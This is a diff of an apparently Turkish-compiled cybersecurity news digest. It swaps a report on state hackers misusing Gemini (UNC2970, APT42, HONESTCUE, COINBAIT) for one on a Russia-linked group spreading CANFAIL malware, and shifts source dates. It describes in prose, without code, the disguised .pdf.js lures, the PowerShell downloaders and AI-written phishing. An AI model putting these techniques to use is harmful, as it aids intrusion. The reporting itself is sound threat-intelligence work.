-Google reported that North Korea-linked hacker group UNC2970 used its Gemini AI model to gather intelligence on targets and support cyber operations. The company also said other threat groups now weaponize generative AI to speed up attack stages, run information operations, and even attempt model extraction attacks.
+“GTIG has recently discovered a threat group suspected to be linked to Russian intelligence services which conducts phishing operations to deliver CANFAIL malware primarily against Ukrainian organizations.” reads the report published by Google. “Despite being less sophisticated and resourced than other Russian threat groups, this actor recently began to overcome some technical limitations using LLMs. Through prompting, they conduct reconnaissance, create lures for social engineering, and seek answers to basic technical questions for post-compromise activity and C2 infrastructure setup.  “
 
-“The North Korean government-backed actor UNC2970 has consistently focused on defense targeting and impersonating corporate recruiters in their campaigns. The group used Gemini to synthesize OSINT and profile high-value targets to support campaign planning and reconnaissance.” reads the report published by Google. “This actor’s target profiling included searching for information on major cybersecurity and defense companies and mapping specific technical job roles and salary information. “
+Though less advanced than other Russian groups, it uses LLMs to craft lures, perform reconnaissance, and solve technical tasks. The threat actors wrote the phishing emails with LLM.
 
-Iran-linked group APT42 also used generative AI tools like Gemini to boost reconnaissance and targeted social engineering. The group searched for official email addresses, researched organizations to build believable pretexts, and created tailored personas based on target biographies. The nation-state actor also used AI for language translation and understanding local context. Google disrupted the activity and disabled related assets.
+Messages include Google Drive links hosting a RAR archive with CANFAIL malware, often disguised with a double extension like .pdf.js. CANFAIL is obfuscated JavaScript that runs a PowerShell script to download and execute a second-stage payload, typically a memory-only dropper, while showing a fake error popup to the victim.
 
-In September 2025, Google tracked new malware called HONESTCUE that uses the Gemini API to generate malicious C# code on demand. Instead of storing full payloads, the malware sends prompts to Gemini, receives source code for a second-stage downloader, compiles it in memory with .NET tools, and executes it without writing files to disk. This fileless approach helps evade detection. Attackers also host payloads on platforms like Discord CDN. Researchers believe a single actor or small group is testing this AI-assisted malware as a proof of concept.
+“Phishing emails sent by the actor contain a lure that based on analysis appears to be LLM-generated, uses formal language and a specific official template, and Google Drive links which host a RAR archive containing CANFAIL malware, often disguised with a .pdf.js double extension.” continues the report. “CANFAIL is obfuscated JavaScript which executes a PowerShell script to download and execute an additional stage, most commonly a memory-only PowerShell dropper. It additionally displays a fake “error” popup to the victim.”
 
-In November 2025, GTIG found COINBAIT, a phishing kit built with help from AI. It pretends to be a major crypto exchange to steal login details. Some of the activity links to UNC5356, a group known for SMS and phone phishing. The kit was likely created using Lovable AI and built as a complex React website. It includes detailed “? Analytics:” logs that show how it tracks and steals data. The attackers hid their systems behind Cloudflare and trusted services to avoid detection. COINBAIT shows a move toward modern web tools and cloud services, may be used by different groups, and also connects to AI-hosted ClickFix scams that trick users into installing malware like ATOMIC.
+SentinelLABS and the Digital Security Lab of Ukraine documented related activity in the October 2025 “PhantomCaptcha” campaign, which briefly used ClickFix tactics.
 
-Underground forums show strong demand for AI tools built for cybercrime. Since most threat actors cannot build their own models, they rely on established services like Gemini. One example, Xanthorox, claimed to be a private custom AI for malware and phishing, but it actually ran on commercial and open-source AI tools layered together.
+Russian espionage groups continue targeting Ukrainian and Western defense-related organizations using military- and drone-themed lures. Below are some groups observed by Google Threat Intelligence Group:
 
-Attackers need stolen API keys to scale abuse, creating risks for organizations using cloud AI services. Criminals often exploit weak security in open-source AI platforms to steal and resell API keys, fueling a black market.
-
-Google disabled accounts linked to this abuse and continues strengthening safeguards, threat detection, red teaming, and secure AI development through frameworks like SAIF and research projects such as Big Sleep and CodeMender.
-
-“The potential of AI, especially generative AI, is immense. As innovation moves forward, the industry needs security standards for building and deploying AI responsibly.” concludes Google.
+“Russia’s use of cyber operations in support of military objectives in the war against Ukraine and beyond is multifaceted. On a tactical level, targeting has broadened to include individuals in addition to organizations in order to support frontline operations and beyond, likely due at least in part to the reliance on public and off-the-shelf technology rather than custom products.” concludes the report. “Russian threat actors have targeted secure messaging applications used by the Ukrainian military to communicate and orchestrate military operations, including via attempts to exfiltrate locally stored databases of these apps, such as from mobile devices captured during Russia’s ongoing invasion of Ukraine. “
 
 Follow me on Twitter: @securityaffairs and Facebook and Mastodon
 
-(XXXXXXX, AÇIK - securityaffairs.com, 14.02.2026)
+(XXXXXXX, AÇIK - securityaffairs.com, 15.02.2026)
 
 ================================================================================
 
@@ -778,7 +812,7 @@ Link: https://www.fortra.com/blog/urgent-warnings-uk-and-us-cyber-agencies-after
 
 ⚠️  Tam metin çekilemedi
 
-(XXXXXXX, AÇIK - fortra.com, 14.02.2026)
+(XXXXXXX, AÇIK - fortra.com, 15.02.2026)
 
 ================================================================================
 
@@ -814,7 +848,7 @@ Now, however, it is the alleged hacker who will be hoping he can escape receivin
 
 If anything, this case serves as a timely reminder to cybercriminals that they should not assume that they have evaded justice just because years have passed since their offence. Digital forensics techniques continue to improve, and law enforcement agencies are increasingly willing to pursue cold cases when new leads emerge.
 
-(XXXXXXX, AÇIK - bitdefender.com, 14.02.2026)
+(XXXXXXX, AÇIK - bitdefender.com, 15.02.2026)
 
 ================================================================================
 
@@ -922,7 +956,7 @@ Graham Cluley is an award-winning keynote speaker who has given presentations ar
 
 Follow him on LinkedIn, Bluesky and Mastodon, or drop him an email.
 
-(XXXXXXX, AÇIK - grahamcluley.com, 14.02.2026)
+(XXXXXXX, AÇIK - grahamcluley.com, 15.02.2026)
 
 ================================================================================
 
@@ -994,7 +1028,7 @@ Russia’s APT28 Targeting Energy Research, Defense Collaboration Entities
 [1] McDermott, R. (2025) AI Knowledge Graph. Available at: https://github.com/robert-mcdermott/ai-knowledge-graph (Accessed: 18 January 2026 - 11 February 2026).
 [2] Reduan, M.H., (2025) Semantic Triples: Definition, Function, Components, Applications, Benefits, Drawbacks and Best Practices for SEO. Available at: https://www.linkedin.com/pulse/semantic-triples-definition-function-components-benefits-reduan-nqmec/ (Accessed: 11 February 2026).
 
-(XXXXXXX, AÇIK - isc.sans.edu, 14.02.2026)
+(XXXXXXX, AÇIK - isc.sans.edu, 15.02.2026)
 
 ================================================================================
 
@@ -1005,7 +1039,7 @@ Link: https://isc.sans.edu/diary/rss/32714
 
 ⚠️  Tam metin çekilemedi
 
-(XXXXXXX, AÇIK - isc.sans.edu, 14.02.2026)
+(XXXXXXX, AÇIK - isc.sans.edu, 15.02.2026)
 
 ================================================================================
 
@@ -1016,7 +1050,7 @@ Link: https://isc.sans.edu/diary/rss/32710
 
 ⚠️  Tam metin çekilemedi
 
-(XXXXXXX, AÇIK - isc.sans.edu, 14.02.2026)
+(XXXXXXX, AÇIK - isc.sans.edu, 15.02.2026)
 
 ================================================================================
 
@@ -1106,7 +1140,7 @@ Intelligence doesn't eliminate uncertainty—it makes uncertainty manageable. Ge
 
 The 2026 State of Security report was produced by Recorded Future's Insikt Group, comprising analysts and security researchers with deep government, law enforcement, military, and intelligence agency experience.
 
-(XXXXXXX, AÇIK - recordedfuture.com, 14.02.2026)
+(XXXXXXX, AÇIK - recordedfuture.com, 15.02.2026)
 
 ================================================================================
 
@@ -1218,7 +1252,7 @@ Download the full 2026 State of Security report
 
 The 2026 State of Security report was produced by Recorded Future's Insikt Group, which comprises analysts and security researchers with deep experience in government, law enforcement, the military, and intelligence agencies.
 
-(XXXXXXX, AÇIK - recordedfuture.com, 14.02.2026)
+(XXXXXXX, AÇIK - recordedfuture.com, 15.02.2026)
 
 ================================================================================
 
@@ -1272,7 +1306,7 @@ Discover how to eliminate workflow bottlenecks, achieve 24/7 threat coverage, an
 
 Download: Reduce 27-step Threat Hunts to 5 Simple Steps
 
-(XXXXXXX, AÇIK - recordedfuture.com, 14.02.2026)
+(XXXXXXX, AÇIK - recordedfuture.com, 15.02.2026)
 
 ================================================================================
 
@@ -1334,7 +1368,7 @@ Sean Cairncross' cybersecurity agenda: less regulation, more cooperation
 
 US wants to push its view of AI cybersecurity standards to the rest of the world
 
-(XXXXXXX, AÇIK - cyberscoop.com, 14.02.2026)
+(XXXXXXX, AÇIK - cyberscoop.com, 15.02.2026)
 
 ================================================================================
 
@@ -1402,7 +1436,7 @@ Sean Cairncross' cybersecurity agenda: less regulation, more cooperation
 
 US wants to push its view of AI cybersecurity standards to the rest of the world
 
-(XXXXXXX, AÇIK - cyberscoop.com, 14.02.2026)
+(XXXXXXX, AÇIK - cyberscoop.com, 15.02.2026)
 
 ================================================================================
 
@@ -1472,7 +1506,7 @@ Sean Cairncross' cybersecurity agenda: less regulation, more cooperation
 
 US wants to push its view of AI cybersecurity standards to the rest of the world
 
-(XXXXXXX, AÇIK - cyberscoop.com, 14.02.2026)
+(XXXXXXX, AÇIK - cyberscoop.com, 15.02.2026)
 
 ================================================================================
 
@@ -1536,7 +1570,7 @@ National Broadband Network
 
 Telecommunications Act of 1996
 
-(XXXXXXX, AÇIK - go.theregister.com, 14.02.2026)
+(XXXXXXX, AÇIK - go.theregister.com, 15.02.2026)
 
 ================================================================================
 
@@ -1646,7 +1680,7 @@ Quantum key distribution
 
 Trusted Platform Module
 
-(XXXXXXX, AÇIK - go.theregister.com, 14.02.2026)
+(XXXXXXX, AÇIK - go.theregister.com, 15.02.2026)
 
 ================================================================================
 
@@ -1690,7 +1724,7 @@ By chaining this with WebKit flaws Apple also addressed in the iOS 26.3 update, 
 
 Apple's updates for iOS and iPadOS also feature a host of other fixes for various bugs, including flaws that grant root access and disclose sensitive user information, but CVE-2026-20700 is the only one it said was exploited in the wild. ®
 
-(XXXXXXX, AÇIK - go.theregister.com, 14.02.2026)
+(XXXXXXX, AÇIK - go.theregister.com, 15.02.2026)
 
 ================================================================================
 
